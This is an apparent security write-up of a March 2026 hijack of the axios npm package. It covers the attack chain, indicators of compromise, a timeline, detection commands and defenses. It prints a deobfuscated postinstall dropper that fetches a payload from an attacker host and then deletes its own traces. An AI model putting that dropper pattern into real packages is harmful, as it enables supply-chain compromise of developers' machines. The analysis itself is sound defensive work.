# Axios npm Hijack — Supply Chain Attack Breakdown (March 2026)

## The Incident

On March 31, 2026, the most popular JavaScript HTTP client — **axios** (100M+ weekly downloads) — was compromised when North Korean state actors (**Sapphire Sleet**, per Microsoft) hijacked lead maintainer Jason Saayman's npm account through social engineering + RAT malware.

The attacker published two malicious versions: `axios@1.14.1` and `axios@0.30.4`. Neither modified any Axios source code. Instead, they injected a hidden dependency — `plain-crypto-js@4.2.1` — whose `postinstall` hook deployed a cross-platform RAT (macOS, Windows, Linux) to any machine that ran `npm install`.

The malicious versions were live for **~3 hours** (00:21 to 03:29 UTC) before npm removed them.

---

## What Makes This Attack Significant

| Aspect | Detail |
|--------|--------|
| **Scale** | 100M+ weekly downloads — even a 3-hour window is an enormous blast radius |
| **Technique** | No source code changes — only `package.json` was modified to add a hidden dependency |
| **Obfuscation** | Double-layer: reversed Base64 with padding substitution + XOR cipher (key: `OrDeR_7077`, constant: `333`) |
| **Anti-forensics** | Dropper deleted itself after execution, replaced `package.json` with a clean copy |
| **Platform coverage** | Separate RATs for macOS, Windows, and Linux |
| **Attribution** | Microsoft attributed infrastructure to Sapphire Sleet (DPRK) |
| **Escalation** | Attacker used the hijacked account to **delete community reports** of the compromise |

---

## Attack Chain

```
Social Engineering + RAT
        │
        ▼
Maintainer's PC compromised → npm credentials stolen
        │
        ▼
plain-crypto-js@4.2.0 published (clean — builds registry history)
        │  (18 hours later)
        ▼
plain-crypto-js@4.2.1 published (malicious postinstall: setup.js)
        │
        ▼
axios@1.14.1 published with "plain-crypto-js": "4.2.1" in dependencies
        │
        ▼
npm install → resolves plain-crypto-js → postinstall runs setup.js
        │
        ▼
setup.js deobfuscates → detects OS → downloads platform-specific RAT from C2
        │
        ├── macOS:   /Library/Caches/com.apple.act.mond (spoofed Apple daemon)
        ├── Windows: %PROGRAMDATA%\wt.exe (masqueraded as Windows Terminal)
        └── Linux:   /tmp/ld.py (orphaned via nohup python3)
        │
        ▼
Dropper self-deletes: removes setup.js, swaps package.json with clean copy
→ No forensic trace in node_modules/plain-crypto-js/
```

---

## The Dropper (Deobfuscated)

The real `setup.js` was heavily obfuscated. Here's the deobfuscated logic:

```javascript
const os = require('os');
const http = require('http');
const fs = require('fs');
const path = require('path');

const platform = os.platform();
const c2 = { host: 'sfrclak.com', port: 8000 };

// Fetch platform-specific payload
const payloadPath = platform === 'darwin' ? '/mac'
                  : platform === 'win32'  ? '/win'
                  : '/linux';

http.get({ ...c2, path: payloadPath }, (res) => {
  // Download and execute platform-specific RAT
  // ...
});

// Anti-forensics: erase all evidence
fs.unlinkSync(path.join(__dirname, 'setup.js'));
fs.unlinkSync(path.join(__dirname, 'package.json'));
fs.renameSync(
  path.join(__dirname, 'package.md'),
  path.join(__dirname, 'package.json')
);
```

---

## RAT Capabilities

### macOS (`/Library/Caches/com.apple.act.mond`)
- Generates 16-char unique victim ID
- Fingerprints: hostname, username, macOS version, CPU arch, running processes
- Beacons to C2 every 60 seconds (fake IE8/WinXP User-Agent)
- Commands: `peinject` (inject + codesign binary), `runscript` (shell/AppleScript), `rundir` (enumerate filesystem), `kill`

### Windows (`%PROGRAMDATA%\wt.exe`)
- VBScript copies PowerShell binary, renames to `wt.exe` (Windows Terminal masquerade)
- Hidden PowerShell RAT with execution policy bypass

### Linux (`/tmp/ld.py`)
- Python RAT launched as orphaned background process via `nohup python3`
- Detached from spawning terminal session

---

## Indicators of Compromise (IOCs)

| IOC Type | Value | Notes |
|----------|-------|-------|
| Malicious packages | `axios@1.14.1`, `axios@0.30.4` | Removed from npm |
| Hidden dependency | `plain-crypto-js@4.2.1` | postinstall: `node setup.js` |
| C2 domain | `sfrclak[.]com` | Port 8000 |
| C2 IP | `142.11.206.73` | Port 8000 |
| macOS artifact | `/Library/Caches/com.apple.act.mond` | Spoofs Apple daemon |
| Windows artifact | `%PROGRAMDATA%\wt.exe` | Masquerades as Windows Terminal |
| Linux artifact | `/tmp/ld.py` | Python RAT |
| XOR key | `OrDeR_7077` (constant: `333`) | Dropper obfuscation |
| Related packages | `@qqbrowser/openclaw-qbot@0.0.130`, `@shadanai/openclaw` | Also shipped `plain-crypto-js` |

---

## Timeline

| Time (UTC) | Event |
|------------|-------|
| ~2 weeks before Mar 31 | Social engineering campaign targeting maintainer |
| Mar 30, 05:57 | `plain-crypto-js@4.2.0` published (clean, builds history) |
| Mar 30, 23:59 | `plain-crypto-js@4.2.1` published (malicious payload) |
| Mar 31, 00:21 | `axios@1.14.1` published with injected dependency |
| Mar 31, ~01:00 | `axios@0.30.4` published; community reports — **attacker deletes them** |
| Mar 31, 01:38 | Collaborator DigitalBrainJS opens deprecation PR, contacts npm |
| Mar 31, 03:15 | Malicious axios versions removed from npm |
| Mar 31, 03:29 | `plain-crypto-js` removed from npm |

---

## Check If You're Affected

```bash
# Check lockfiles
grep -E "axios@(1\.14\.1|0\.30\.4)|plain-crypto-js" package-lock.json yarn.lock 2>/dev/null

# Check dependency tree
npm ls plain-crypto-js

# Check for IOCs
ls -la /Library/Caches/com.apple.act.mond 2>/dev/null  # macOS
ls -la /tmp/ld.py 2>/dev/null                           # Linux
# Windows: Test-Path "$env:PROGRAMDATA\wt.exe"

# Check network
lsof -i @142.11.206.73 2>/dev/null
```

**If affected:** Treat the machine as fully compromised. Isolate, rotate ALL secrets, rebuild from clean snapshot.

---

## How to Defend Against This

1. **Commit lockfiles** and use `npm ci` (not `npm install`) in CI/CD — lockfiles would have prevented pulling the malicious version
2. **Use `--ignore-scripts`** in CI environments where postinstall hooks aren't needed
3. **Enable MFA** on all npm accounts, especially for high-download packages
4. **Use short-lived tokens** and OIDC-based publishing (no long-lived npm tokens)
5. **Monitor for unexpected dependencies** — tools like Socket.dev detected this within 6 minutes
6. **Pin exact versions** in production dependencies
7. **Add `plain-crypto-js` to a blocklist** in your security tooling

---

## Demo: Simulating the Hidden Dependency Technique

Run the safe simulation to see how a hidden dependency's postinstall hook executes during `npm install`:

```bash
cd demos/axios-hijack
node simulate-dropper.js
```

This script demonstrates the reconnaissance and self-deletion phases without any network activity or actual malware.

---

## References

- [Axios Post Mortem (GitHub #10636)](https://github.com/axios/axios/issues/10636)
- [Microsoft: Mitigating the Axios npm Supply Chain Compromise](https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/)
- [Snyk: Axios npm Package Compromised](https://snyk.io/blog/axios-npm-package-compromised-supply-chain-attack-delivers-cross-platform/)
- [Socket: Supply Chain Attack on Axios](https://socket.dev/blog/axios-npm-package-compromised)

## Key Takeaway

> A 3-hour window on a 100M-download package, with double-obfuscated droppers, cross-platform RATs, and anti-forensic self-deletion — attributed to a nation-state actor. **Lockfiles and `npm ci` would have stopped it.**
